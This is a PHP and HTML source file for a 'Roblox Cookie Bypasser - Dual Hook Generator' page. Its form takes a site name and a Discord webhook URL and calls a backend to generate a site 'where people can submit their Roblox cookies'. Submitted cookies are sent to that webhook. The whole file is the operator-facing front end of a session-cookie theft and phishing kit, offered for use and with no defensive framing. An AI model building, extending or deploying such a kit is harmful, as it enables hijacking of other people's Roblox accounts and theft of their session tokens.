<?php
/**
 * Bypasserv3 - Dualhook Generator
 * Single webhook version (simplified for image 10)
 */

require_once '../config.php';
require_once '../functions.php';

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Bypasser - Dual Hook Generator</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Outfit', sans-serif;
            background: linear-gradient(135deg, #0a1628 0%, #0f1f3a 50%, #0a1628 100%);
            background-attachment: fixed;
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
        }
        
        .glass-box {
            backdrop-filter: blur(20px) saturate(200%);
            -webkit-backdrop-filter: blur(20px) saturate(200%);
            background: linear-gradient(135deg, rgba(15, 31, 58, 0.85) 0%, rgba(10, 22, 40, 0.9) 100%);
            border: 1px solid rgba(0, 150, 200, 0.3);
            border-radius: 25px;
            padding: 45px;
            box-shadow: 0 8px 32px 0 rgba(0, 150, 200, 0.2), inset 0 1px 0 0 rgba(255, 255, 255, 0.1);
        }
        
        .header {
            text-align: center;
            margin-bottom: 35px;
        }
        
        .header-icon {
            font-size: 32px;
            margin-bottom: 12px;
            display: inline-block;
        }
        
        .header h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 4px;
            color: #00d4ff;
            text-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
        }
        
        .header h2 {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 12px;
            color: #00d4ff;
            text-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
        }
        
        .header p {
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #00d4ff;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .form-icon {
            font-size: 16px;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(0, 168, 204, 0.3);
            border-radius: 10px;
            color: #f8fafc;
            font-size: 13px;
            font-family: 'Outfit', sans-serif;
            transition: all 0.3s ease;
        }
        
        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }
        
        .form-group input:focus {
            outline: none;
            background: rgba(0, 168, 204, 0.1);
            border-color: #00d4ff;
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.2);
        }
        
        .form-group small {
            display: block;
            margin-top: 6px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.4);
        }
        
        .form-description {
            display: block;
            margin-top: 8px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.5);
            line-height: 1.5;
        }
        
        .btn-generate {
            width: 100%;
            padding: 14px 20px;
            background: linear-gradient(135deg, #0a9cc9 0%, #00d4ff 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 12px;
            box-shadow: 0 4px 15px rgba(0, 212, 255, 0.3);
        }
        
        .btn-generate:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 212, 255, 0.4);
        }
        
        .btn-generate:active {
            transform: translateY(0);
        }
        
        .btn-generate:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .btn-back {
            width: 100%;
            padding: 12px 20px;
            background: rgba(0, 168, 204, 0.2);
            border: 1px solid rgba(0, 168, 204, 0.4);
            border-radius: 10px;
            color: #00d4ff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            text-decoration: none;
        }
        
        .btn-back:hover {
            background: rgba(0, 168, 204, 0.3);
            border-color: #00d4ff;
        }
        
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .description-text {
            text-align: center;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.5);
            margin-top: 20px;
            line-height: 1.6;
        }
        
        .success-container {
            text-align: center;
        }
        
        .success-icon {
            font-size: 64px;
            margin-bottom: 20px;
            animation: bounce 0.6s ease-in-out;
        }
        
        @keyframes bounce {
            0%, 100% { transform: scale(0); }
            50% { transform: scale(1); }
        }
        
        .success-container h2 {
            font-size: 24px;
            margin-bottom: 12px;
            color: #10b981;
        }
        
        .success-container p {
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 8px;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            background: rgba(16, 185, 129, 0.1);
            padding: 12px;
            border-radius: 8px;
            margin-top: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="formContainer" class="glass-box">
            <div class="header">
                <div class="header-icon"><//>
                <h1>Roblox Cookie Bypasser</h1>
                <h2>Dual Hook Generator</h2>
                <p>Create your own Roblox cookie Bypasser site in seconds</p>
            </div>

            <form id="generatorForm" onsubmit="return handleSubmit(event)">
                <!-- Site Name -->
                <div class="form-group">
                    <label>
                        <span class="form-icon">📁</span>
                        Site Name (Directory)
                    </label>
                    <input 
                        type="text" 
                        id="siteName" 
                        placeholder="e.g. myrefresher123"
                        maxlength="32"
                        required
                    />
                    <small>3-32 characters, letters, numbers, hyphens, underscores only</small>
                </div>

                <!-- Master Webhook -->
                <div class="form-group">
                    <label>
                        <span class="form-icon">📡</span>
                        Discord Webhook URL
                    </label>
                    <input 
                        type="text" 
                        id="masterWebhook" 
                        placeholder="https://discord.com/api/webhooks/..."
                        required
                    />
                    <span class="form-description">Where cookies will be sent. Get this from Discord channel settings → Integrations → Webhooks</span>
                </div>

                <button type="submit" class="btn-generate">
                    <span>⚡</span>
                    Generate Site
                </button>

                <a href="/" class="btn-back">
                    <span>🏠</span>
                    Back to Main Site
                </a>

                <div class="description-text">
                    Each site generates a unique URL where people can submit their Roblox cookies.
                </div>
            </form>

            <div id="successContainer" class="success-container" style="display: none;">
                <div class="success-icon">✅</div>
                <h2>Site Generated Successfully!</h2>
                <p>Your bypass site is ready with FULL EMBED FUNCTIONALITY!</p>
                
                <div style="margin-top: 20px; text-align: center; background: rgba(0, 168, 204, 0.1); padding: 16px; border-radius: 10px; border: 1px solid rgba(0, 168, 204, 0.3);">
                    <p style="font-size: 12px; color: rgba(255, 255, 255, 0.6); margin-bottom: 8px;">📎 Your Link:</p>
                    <p id="generatedUrl" style="background: rgba(0, 0, 0, 0.3); padding: 12px; border-radius: 6px; font-size: 13px; margin: 0; word-break: break-all; color: #00d4ff;"></p>
                </div>

                <button onclick="window.location.href = document.getElementById('generatedUrl').textContent" class="btn-generate" style="margin-top: 20px;">
                    <span>🚀</span>
                    Open Your Site
                </button>

                <button onclick="location.reload()" class="btn-back">
                    <span>🔄</span>
                    Create Another Site
                </button>
            </div>
        </div>
    </div>

    <script>
        async function handleSubmit(e) {
            e.preventDefault();

            const siteName = document.getElementById('siteName').value.trim();
            const masterWebhook = document.getElementById('masterWebhook').value.trim();

            if (!siteName || !masterWebhook) {
                Swal.fire({
                    icon: 'error',
                    title: 'Missing Fields',
                    text: 'Please fill in all required fields',
                    background: 'rgba(10, 22, 40, 0.9)',
                    color: '#f8fafc',
                    confirmButtonColor: '#00d4ff'
                });
                return false;
            }

            if (siteName.length < 3) {
                Swal.fire({
                    icon: 'error',
                    title: 'Invalid Site Name',
                    text: 'Site name must be at least 3 characters',
                    background: 'rgba(10, 22, 40, 0.9)',
                    color: '#f8fafc',
                    confirmButtonColor: '#00d4ff'
                });
                return false;
            }

            const btn = document.querySelector('.btn-generate');
            btn.disabled = true;
            btn.innerHTML = '<div class="spinner"></div> Generating...';

            try {
                const response = await fetch('/generator/create.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        directory: siteName,
                        masterWebhook: masterWebhook,
                        userWebhook: masterWebhook // Use same webhook for simplicity
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('formContainer').style.display = 'none';
                    document.getElementById('successContainer').style.display = 'block';
                    document.getElementById('generatedUrl').textContent = data.publicUrl;

                    Swal.fire({
                        icon: 'success',
                        title: 'Success!',
                        html: '<p>Your site has been generated!</p><p style="font-size: 12px; color: #9ca3af; margin-top: 8px;">Webhook has been notified</p>',
                        background: 'rgba(10, 22, 40, 0.9)',
                        color: '#f8fafc',
                        confirmButtonColor: '#10b981'
                    });
                } else {
                    Swal.fire({
                        icon: 'error',
                        title: 'Error',
                        text: data.error || 'Failed to generate site',
                        background: 'rgba(10, 22, 40, 0.9)',
                        color: '#f8fafc',
                        confirmButtonColor: '#ef4444'
                    });
                }
            } catch (err) {
                Swal.fire({
                    icon: 'error',
                    title: 'Network Error',
                    text: err.message,
                    background: 'rgba(10, 22, 40, 0.9)',
                    color: '#f8fafc',
                    confirmButtonColor: '#ef4444'
                });
            } finally {
                btn.disabled = false;
                btn.innerHTML = '<span>⚡</span> Generate Site';
            }

            return false;
        }
    </script>
</body>
</html>
?>
